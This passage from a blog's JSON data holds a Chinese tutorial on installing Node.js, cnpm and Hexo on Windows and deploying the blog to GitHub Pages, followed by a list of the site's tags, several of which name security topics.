将nodejs加入path环境变量中。打开cmd测试： 报错1：输入 npm-v 出现报错: npm WARN config global --global, --local are deprecated. Use `–location 解决方法：打开nodejs安装位置文件夹，打开npm.cmd和npm，将文件中的prefix -g替换为prefix --location=global,保存后重新打开cmd测试即可。 安装hexo换源（淘宝源）npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm -v 查看版本以及是否安装成功。 安装hexocnpm install -g hexo-cli hexo -v 新建文件夹放置博客内容，在cmd中进入所建立的目录： hexo init #初始化hexo hexo s #启动hexo 访问 http://localhost:4000/如下即成功： 新建文章hexo new \"文章标题\" 在目录/source/_posts/下生成文件.md更新文章： hexo clean hexo g hexo s 部署github1、建立一个新的库，命名需要符合规则：username.gitgub.io2、命令行输入： cnpm install --save hexo-deployer-git 3、更改设置 找到_config.yml文件，翻到最底部 将type改为git 添加repo: \"此处为仓库地址\" 添加branch: master repo为仓库地址 branch为master即可 4、部署到远端 git config --global user.email \"xxx(此处为邮箱)\" git config --global user.name \"xxx(此处为用户名)\" #github用户名 hexo d 弹出网页提示是否关联git和github 授权即可","categories":[],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]}],"categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"},{"name":"docker","slug":"docker","permalink":"https://sinky.top/tags/docker/"},{"name":"vulhub","slug":"vulhub","permalink":"https://sinky.top/tags/vulhub/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"墨者学院，靶场，防火墙","slug":"墨者学院，靶场，防火墙","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%8C%E9%9D%B6%E5%9C%BA%EF%BC%8C%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"漏洞","slug":"漏洞","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"PWN","slug":"PWN","permalink":"https://sinky.top/tags/PWN/"},{"name":"exp","slug":"exp","permalink":"https://sinky.top/tags/exp/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"},{"name":"checksec","slug":"checksec","permalink":"https://sinky.top/tags/checksec/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"业务渗透","slug":"业务渗透","permalink":"https://sinky.top/tags/%E4%B8%9A%E5%8A%A1%E6%B8%97%E9%80%8F/"},{"name":"WEB，学习笔记","slug":"WEB，学习笔记","permalink":"https://sinky.top/tags/WEB%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"墨者学院","slug":"墨者学院","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"搭建环境","slug":"搭建环境","permalink":"https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"},{"name":"ida远程","slug":"ida远程","permalink":"https://sinky.top/tags/ida%E8%BF%9C%E7%A8%8B/"},{"name":"linux","slug":"linux","permalink":"https://sinky.top/tags/linux/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"文件分析","slug":"文件分析","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"},{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"},{"name":"软件测试，面试准备","slug":"软件测试，面试准备","permalink":"https://sinky.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"},{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"sql","slug":"sql","permalink":"https://sinky.top/tags/sql/"},{"name":"SSRF","slug":"SSRF","permalink":"https://sinky.top/tags/SSRF/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"WebShell","slug":"WebShell","permalink":"https://sinky.top/tags/WebShell/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://sinky.top/tags/RCE/"},{"name":"Re","slug":"Re","permalink":"https://sinky.top/tags/Re/"},{"name":"Buu","slug":"Buu","permalink":"https://sinky.top/tags/Buu/"},{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"},{"name":"windows漏洞","slug":"windows漏洞","permalink":"https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"XSS","permalink":"https://sinky.top/tags/XSS/"},{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"},{"name":"学习记录","slug":"学习记录","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"chrome调试","slug":"chrome调试","permalink":"https://sinky.top/tags/chrome%E8%B0%83%E8%AF%95/"},{"name":"bp","slug":"bp","permalink":"https://sinky.top/tags/bp/"},{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"},{"name":"工具学习","slug":"工具学习","permalink":"https://sinky.top/tags/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"二进制","slug":"二进制","permalink":"https://sinky.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://sinky.top/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"name":"漏洞，路由器漏洞","slug":"漏洞，路由器漏洞","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]}